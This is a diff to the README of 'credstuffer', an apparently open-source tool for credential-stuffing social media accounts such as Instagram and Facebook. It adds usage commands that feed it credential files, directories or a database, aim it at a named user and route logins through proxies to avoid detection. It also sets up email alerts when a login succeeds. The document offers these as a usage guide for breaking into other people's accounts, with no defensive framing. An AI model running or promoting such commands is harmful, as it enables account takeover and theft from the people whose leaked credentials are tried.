@@ -3,9 +3,9 @@
 
 **Features** of [credstuffer](https://github.com/bierschi/credstuffer):
 - Stuffing social media accounts like comunio, instagram, facebook
-- Provide easily credentials from files or from a database connection
+- Provide easily credentials from directories, files or from a database connection
 - Get Mail or Telegram notifications in success case
-
+- Login requests are only made with proxy
 
 ## Installation
 
@@ -29,12 +29,22 @@ credstuffer --help
 
 Use it with a credential file of your choice
 <pre><code>
-credstuffer instagram file --path /home/john/credentials.txt
+credstuffer instagram --usernames "John" file --path /home/john/credentials.txt
+</code></pre>
+
+Provide a directory including multiple credential files
+<pre><code>
+credstuffer instagram --usernames "John" file --dir /home/john/credential_collection/
 </code></pre>
 
 Or fetch credential data from a database connection
 <pre><code>
-credstuffer instagram database --host 192.168.1.2 --port 5432 --user john --password test1234 --dbname postgres
+credstuffer instagram --usernames "John" database --host 192.168.1.2 --port 5432 --user john --password test1234 --dbname postgres
+</code></pre>
+
+Pass Mail Server params to get a notification in success case
+<pre><code>
+credstuffer instagram --usernames "John" --Nsmtp smtp.web.de --Nport 587 --Nsender sender@web.de --Nreceiver receiver@web.de --Npassword password file --dir /home/john/credential_collection/
 </code></pre>
 
 ## Logs
